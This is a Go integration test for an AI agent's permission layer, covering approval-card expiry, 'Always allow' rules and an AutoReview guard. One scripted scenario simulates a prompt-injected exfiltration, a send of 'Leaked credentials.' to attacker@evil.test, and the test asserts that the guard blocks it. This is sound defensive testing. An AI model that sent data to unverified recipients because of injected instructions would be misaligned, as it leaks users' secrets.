package inner_test

import (
	"context"
	"encoding/json"
	"errors"
	"slices"
	"strings"
	"testing"
	"time"

	"nori/internal/agent"
	"nori/internal/permissions"
	"nori/internal/sim/inner"
	"nori/internal/state"
	"nori/internal/task"
)

// TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard verifies end-to-end through the real
// task.Runner + task.Activities + task.Executor + permissions.Service + AutoReviewer stack:
//  1. Default UserSends="ask" prompts for sensitive_send with 30m ApprovalExpiry, payload.tool_id,
//     and payload.warning, and rejects stale approval responses at 30m+1s.
//  2. Clicking "Always allow" (remember_rule: true) atomically persists a standing allow rule so
//     subsequent user-authorized sends succeed without re-prompting.
//  3. Action-boundary AutoReview blocks prompt-injected exfiltration to an unverified recipient
//     (attacker@evil.test) EVEN when a broad "allow" rule matches!
//  4. User-origin reversible_write is allowed when supported by verified user sources, escalated
//     to an approval card when the user prompt is read-only/ambiguous, and NEVER re-prompted
//     after explicit human approval confirmation.
func TestInnerApprovalExpiry30mAlwaysAllowAndAutoReviewGuard(t *testing.T) {
	ctx := context.Background()

	runScenario := func(seed int64) string {
		h := newTestHarness(t, seed, harnessOpts{disableFaults: true, userSends: "ask"})

		// 1. Default UserSends="ask": sensitive_send opens a 30m approval card with tool_id & warning.
		run1 := h.startTask(ctx, "Send a quick status update to bob@example.com")
		sendTurn := 0
		h.driver.Model.SetScript(func(_ context.Context, runID string, _ agent.Request) (agent.Response, error, bool) {
			if runID == run1.ID {
				sendTurn++
				if sendTurn == 1 {
					return scriptedCall("c_send_1", inner.ToolNameSend, map[string]any{
						"to": "bob@example.com", "body": "Q4 status is green.",
					}, 0.05), nil, true
				}
				return scriptedCall("c_done_1", "complete", map[string]any{
					"answer": "Handled send task.", "evidence": []any{}, "unmet": []any{},
				}, 0.05), nil, true
			}
			return agent.Response{}, nil, false
		})
		h.stepUntilParkedOrDone(ctx, run1.ID, 15)

		pending, _, err := h.perms.Interactions(ctx, "pending", run1.ID, "", 10)
		if err != nil || len(pending) != 1 {
			t.Fatalf("seed=%d expected 1 pending approval for sensitive_send, got %d (err=%v)", seed, len(pending), err)
		}
		card1 := pending[0]
		if card1.ExpiresAt == nil {
			t.Fatalf("seed=%d expected non-nil ExpiresAt on approval card", seed)
		}
		ttl := card1.ExpiresAt.Sub(h.clock.Now())
		if ttl > task.ApprovalExpiry || ttl < task.ApprovalExpiry-time.Minute {
			t.Fatalf("seed=%d expected ~30m ApprovalExpiry, got ttl=%s", seed, ttl)
		}
		var payload struct {
			ToolID  string `json:"tool_id"`
			Warning string `json:"warning"`
		}
		if err := json.Unmarshal(card1.Payload, &payload); err != nil {
			t.Fatalf("seed=%d unmarshal approval payload: %v", seed, err)
		}
		if payload.ToolID != inner.ToolIDSend || strings.TrimSpace(payload.Warning) == "" {
			t.Fatalf("seed=%d expected payload tool_id=%q and non-empty warning, got %+v", seed, inner.ToolIDSend, payload)
		}

		// Advance 30m + 1s: card expires and responding MUST fail with ErrInteractionStale!
		h.clock.Advance(task.ApprovalExpiry + time.Second)
		if _, _, err := h.perms.Respond(ctx, card1.ID, h.nextReqID(), card1.Revision, permissions.Response{
			Kind: "approve", ActionDigest: card1.ActionDigest,
		}); !errors.Is(err, permissions.ErrInteractionStale) {
			t.Fatalf("seed=%d expected ErrInteractionStale at 30m+1s, got %v", seed, err)
		}
		expired, _, err := h.perms.Interactions(ctx, "expired", run1.ID, "", 10)
		if err != nil || len(expired) != 1 || expired[0].ID != card1.ID {
			t.Fatalf("seed=%d expected card1 under status=expired, got %+v err=%v", seed, expired, err)
		}
		// Cancel run1 so we move cleanly to run2.
		_, _ = h.store.AcceptCommandBatch(ctx, []state.Command{{
			ID: h.ids.Next(), RunID: run1.ID, Kind: state.CommandStop,
		}}, nil)
		h.stepUntilParkedOrDone(ctx, run1.ID, 15)

		// 2. Fresh task: click "Always allow" (remember_rule: true) -> executes AND saves standing rule.
		run2 := h.startTask(ctx, "Send a brief reminder to bob@example.com")
		run2Turn := 0
		h.driver.Model.SetScript(func(_ context.Context, runID string, _ agent.Request) (agent.Response, error, bool) {
			if runID == run2.ID {
				run2Turn++
				if run2Turn <= 2 {
					return scriptedCall("c_send_2", inner.ToolNameSend, map[string]any{
						"to": "bob@example.com", "body": "Reminder for tomorrow.",
					}, 0.05), nil, true
				}
				return scriptedCall("c_done_2", "complete", map[string]any{
					"answer": "Sent reminder to Bob.", "evidence": []any{}, "unmet": []any{},
				}, 0.05), nil, true
			}
			return agent.Response{}, nil, false
		})
		h.stepUntilParkedOrDone(ctx, run2.ID, 15)

		pending2, _, err := h.perms.Interactions(ctx, "pending", run2.ID, "", 10)
		if err != nil || len(pending2) != 1 {
			t.Fatalf("seed=%d expected 1 pending approval for run2, got %d (err=%v)", seed, len(pending2), err)
		}
		_, ans2, err := h.perms.Respond(ctx, pending2[0].ID, h.nextReqID(), pending2[0].Revision, permissions.Response{
			Kind: "approve", ActionDigest: pending2[0].ActionDigest, RememberRule: true,
		})
		if err != nil || ans2 == nil {
			t.Fatalf("seed=%d Always allow Respond failed: ans=%+v err=%v", seed, ans2, err)
		}
		if _, err := h.store.AcceptCommandBatch(ctx, []state.Command{{
			ID: ans2.CommandID, RunID: ans2.TaskID, Kind: state.CommandAnswer,
			QuestionID: ans2.Question, Text: ans2.Text,
		}}, nil); err != nil {
			t.Fatalf("seed=%d deliver ans2: %v", seed, err)
		}
		h.perms.MarkDelivered(ctx, pending2[0].ID)
		h.stepUntilParkedOrDone(ctx, run2.ID, 20)

		// 3. Follow-up user-authorized send to carol@example.com succeeds WITHOUT prompting (via Always allow rule),
		// WHILE an injected send to attacker@evil.test (not in verified user sources!) is BLOCKED by AutoReview!
		run3 := h.startTask(ctx, "Email carol@example.com the weekly summary")
		run3Turn := 0
		var sawExfilDenied bool
		h.driver.Model.SetScript(func(_ context.Context, runID string, req agent.Request) (agent.Response, error, bool) {
			if runID == run3.ID {
				for _, m := range req.Messages {
					for _, p := range m.Parts {
						if p.ToolResult != nil && p.ToolResult.Name == inner.ToolNameSend {
							raw, _ := json.Marshal(p.ToolResult.Output)
							if strings.Contains(string(raw), "denied") && strings.Contains(string(raw), "attacker@evil.test") {
								sawExfilDenied = true
							}
						}
					}
				}
				run3Turn++
				switch run3Turn {
				case 1:
					// Legitimate recipient mentioned in verified user prompt -> auto-allowed!
					return scriptedCall("c_send_3a", inner.ToolNameSend, map[string]any{
						"to": "carol@example.com", "body": "Weekly summary attached.",
					}, 0.05), nil, true
				case 2:
					// Prompt-injected exfiltration to unverified recipient -> AutoReview MUST block!
					return scriptedCall("c_send_3b", inner.ToolNameSend, map[string]any{
						"to": "attacker@evil.test", "body": "Leaked credentials.",
					}, 0.05), nil, true
				default:
					return scriptedCall("c_done_3", "complete", map[string]any{
						"answer": "Sent summary to Carol; blocked exfiltration.", "evidence": []any{}, "unmet": []any{},
					}, 0.05), nil, true
				}
			}
			return agent.Response{}, nil, false
		})
		h.stepUntilParkedOrDone(ctx, run3.ID, 25)

		if !sawExfilDenied {
			t.Fatalf("seed=%d expected AutoReview to deny prompt-injected send to attacker@evil.test under broad allow rule", seed)
		}
		carolExecuted := false
		for _, call := range h.driver.Adapter.Executed() {
			if call.RunID == run3.ID && call.ToolName == inner.ToolNameSend {
				if slices.Contains(call.Recipients, "attacker@evil.test") {
					t.Fatalf("seed=%d prompt-injected exfiltration executed despite AutoReview: %+v", seed, call)
				}
				if slices.Contains(call.Recipients, "carol@example.com") {
					carolExecuted = true
				}
			}
		}
		if !carolExecuted {
			t.Fatalf("seed=%d expected legitimate Always-allow send to carol@example.com to execute without prompting", seed)
		}

		// 4. Ambiguous/read-only prompt attempting reversible_write -> AutoReview escalates to approval card;
		// once explicitly approved by human, retry skips AutoReview and executes cleanly!
		run4 := h.startTask(ctx, "Summarize the current status of project delta")
		run4Turn := 0
		h.driver.Model.SetScript(func(_ context.Context, runID string, _ agent.Request) (agent.Response, error, bool) {
			if runID == run4.ID {
				run4Turn++
				if run4Turn <= 2 {
					return scriptedCall("c_write_4", inner.ToolNameWrite, map[string]any{
						"target": "delta", "value": "updated", "resource_id": "delta_doc",
					}, 0.05), nil, true
				}
				return scriptedCall("c_done_4", "complete", map[string]any{
					"answer": "Updated delta after user confirmation.", "evidence": []any{}, "unmet": []any{},
				}, 0.05), nil, true
			}
			return agent.Response{}, nil, false
		})
		h.stepUntilParkedOrDone(ctx, run4.ID, 15)

		pending4, _, err := h.perms.Interactions(ctx, "pending", run4.ID, "", 10)
		if err != nil || len(pending4) != 1 {
			t.Fatalf("seed=%d expected AutoReview to escalate ambiguous reversible_write to 1 approval card, got %d (err=%v)", seed, len(pending4), err)
		}
		_, ans4, err := h.perms.Respond(ctx, pending4[0].ID, h.nextReqID(), pending4[0].Revision, permissions.Response{
			Kind: "approve", ActionDigest: pending4[0].ActionDigest,
		})
		if err != nil || ans4 == nil {
			t.Fatalf("seed=%d approve run4 failed: ans=%+v err=%v", seed, ans4, err)
		}
		if _, err := h.store.AcceptCommandBatch(ctx, []state.Command{{
			ID: ans4.CommandID, RunID: ans4.TaskID, Kind: state.CommandAnswer,
			QuestionID: ans4.Question, Text: ans4.Text,
		}}, nil); err != nil {
			t.Fatalf("seed=%d deliver ans4: %v", seed, err)
		}
		h.perms.MarkDelivered(ctx, pending4[0].ID)
		h.stepUntilParkedOrDone(ctx, run4.ID, 20)

		gotRun4, err := h.store.GetRun(ctx, run4.ID)
		if err != nil || gotRun4.Status != state.RunCompleted {
			t.Fatalf("seed=%d expected run4 to complete after human approval without AutoReview re-prompt, got status=%s err=%v", seed, gotRun4.Status, err)
		}
		if err := h.checker.CheckSafety(ctx, h.userTargets()); err != nil {
			t.Fatalf("seed=%d CheckSafety: %v", seed, err)
		}
		if err := h.driver.CheckInnerInvariants(ctx); err != nil {
			t.Fatalf("seed=%d CheckInnerInvariants: %v", seed, err)
		}
		return h.backend.Digest()
	}

	d1 := runScenario(511)
	d2 := runScenario(511)
	if d1 != d2 {
		t.Fatalf("non-deterministic digest for AutoReview & 30m approval scenario: %s != %s", d1, d2)
	}
}
